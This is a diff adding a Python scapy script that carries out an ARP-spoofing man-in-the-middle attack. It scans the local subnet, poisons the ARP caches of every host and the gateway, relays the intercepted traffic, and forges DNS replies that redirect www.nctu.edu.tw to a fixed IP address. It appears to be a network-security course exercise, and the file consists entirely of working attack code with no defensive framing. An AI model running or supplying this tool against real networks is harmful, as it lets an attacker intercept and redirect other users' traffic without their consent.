@@ -1,0 +1,68 @@
+#!/usr/bin/env python3
+
+from scapy.all import *
+import netifaces
+from ipaddress import IPv4Network
+
+def process_packet(pkt):
+	if pkt.haslayer('DNS'):
+		if str(pkt[DNS].qd.qname) == "b'www.nctu.edu.tw.'":
+			eth=Ether(src=gateway_macaddress, dst=pkt[Ether].src)
+			ip=IP(dst=pkt[IP].src, src=gateway_ip)
+			udp=UDP(sport=53, dport=pkt[UDP].sport)
+			dns=DNS(id=pkt[DNS].id, qr=1, aa=1, rd=0, ra=0, ancount=1, qd=DNSQR(qname=pkt[DNS].qd.qname,qtype='A'),an=DNSRR(rrname=pkt[DNS].qd.qname,rdata='140.113.207.246')/DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='140.113.207.246', ttl=259200))
+			pkt_forged = eth/ip/udp/dns
+			sendp(pkt_forged, verbose=False)
+	else:
+		if pkt.haslayer('IP'): 
+			if pkt[IP].dst in list(ip_mac):
+				pkt[Ether].dst = ip_mac[pkt[IP].dst]
+				pkt[Ether].src = own_mac
+			else:
+				pkt[Ether].dst = gateway_macaddress
+				pkt[Ether].src = own_mac
+			if len(str(pkt)) < 4096:
+				sendp(pkt, verbose=False)	
+	
+interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
+netmask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['netmask']
+
+cidr = IPv4Network('0.0.0.0/' + netmask).prefixlen
+own_ip = get_if_addr(interface)
+own_mac = get_if_hwaddr(interface)
+
+gateway_ip = conf.route.route("0.0.0.0")[2]
+network = own_ip + '/' + str(cidr)
+gateway_macaddress = ''
+print('Available devices')
+print('-----------------------------------------')
+print('IP\t\t\tMac Address')
+print('-----------------------------------------')
+ans, unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=network), timeout=2, verbose=False)
+ip_mac = {}
+for send, rcv in ans:
+	ip_mac[rcv.sprintf("%ARP.psrc%")] = rcv.sprintf("%Ether.src%")
+	if rcv.sprintf("%ARP.psrc%") != gateway_ip:
+		print(rcv.sprintf("%ARP.psrc%\t\t%Ether.src%"))
+	if rcv.sprintf("%ARP.psrc%") == gateway_ip:
+		gateway_macaddress = rcv.sprintf("%Ether.src%")
+
+for send, rcv in ans:
+	victim_ip = rcv.sprintf("%ARP.psrc%")
+	victim_macaddress = rcv.sprintf("%Ether.src%")
+	if victim_ip != gateway_ip:
+		arp_response = Ether(src=own_mac, dst=victim_macaddress, type=2054)/ARP(hwdst=victim_macaddress, ptype=2048, hwtype=1, psrc=gateway_ip, hwlen=6, plen=4, pdst=victim_ip, hwsrc=own_mac, op=2)
+		sendp(arp_response, verbose=False)
+		arp_response = Ether(src=own_mac, dst=gateway_macaddress, type=2054)/ARP(hwdst=gateway_macaddress, ptype=2048, hwtype=1, psrc=victim_ip, hwlen=6, plen=4, pdst=gateway_ip, hwsrc=own_mac, op=2)
+		sendp(arp_response, verbose=False)
+while True:
+	sniff(prn=process_packet, count = 1, store = 0)
+	
+		
+
+
+
+
+
+
+ 
